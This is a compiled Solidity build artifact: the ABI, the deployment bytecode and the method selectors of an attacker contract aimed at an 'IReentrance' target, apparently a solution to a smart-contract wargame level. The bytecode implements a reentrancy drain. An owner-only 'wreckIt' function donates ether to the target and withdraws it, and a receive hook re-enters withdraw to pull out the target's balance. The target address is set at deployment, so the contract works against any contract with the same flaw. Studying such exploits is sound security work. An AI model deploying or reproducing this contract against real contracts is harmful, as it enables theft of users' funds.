{
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "target",
      "outputs": [
        {
          "internalType": "contract IReentrance",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "wreckIt",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "stateMutability": "payable",
      "type": "receive"
    }
  ],
  "bytecode": {
    "object": "0x60c060405234801561001057600080fd5b506040516103c03803806103c083398101604081905261002f91610044565b6001600160a01b03166080523360a052610074565b60006020828403121561005657600080fd5b81516001600160a01b038116811461006d57600080fd5b9392505050565b60805160a05161030c6100b4600039600081816101030152610180015260008181607301528181610153015281816101f5015261026c015261030c6000f3fe6080604052600436106100385760003560e01c806304584af1146100e75780638da5cb5b146100f1578063d4b839921461014157600080fd5b366100e25760005460ff1615156001141561004f57005b6000805460ff19166001179055604051632e1a7d4d60e01b81526001600160a01b037f0000000000000000000000000000000000000000000000000000000000000000168031600483015290632e1a7d4d90602401600060405180830381600087803b1580156100be57600080fd5b505af11580156100d2573d6000803e3d6000fd5b50506000805460ff191690555050005b600080fd5b6100ef610175565b005b3480156100fd57600080fd5b506101257f000000000000000000000000000000000000000000000000000000000000000081565b6040516001600160a01b03909116815260200160405180910390f35b34801561014d57600080fd5b506101257f000000000000000000000000000000000000000000000000000000000000000081565b336001600160a01b037f000000000000000000000000000000000000000000000000000000000000000016146101e15760405162461bcd60e51b815260206004820152600d60248201526c22a9292fa727aa2fa7aba722a960991b604482015260640160405180910390fd5b60405162362a9560e01b81523060048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169062362a959034906024016000604051808303818588803b15801561024157600080fd5b505af1158015610255573d6000803e3d6000fd5b5050604051632e1a7d4d60e01b81523460048201527f00000000000000000000000000000000000000000000000000000000000000006001600160a01b03169350632e1a7d4d92506024019050600060405180830381600087803b1580156102bc57600080fd5b505af11580156102d0573d6000803e3d6000fd5b5050505056fea26469706673582212205fe8e839c5e964fb77e6d3d7b83883db240e23b76330d62be7d0b1616c475ddc64736f6c634300080a0033",
    "linkReferences": {}
  },
  "methodIdentifiers": {
    "owner()": "8da5cb5b",
    "target()": "d4b83992",
    "wreckIt()": "04584af1"
  },
  "id": 6
}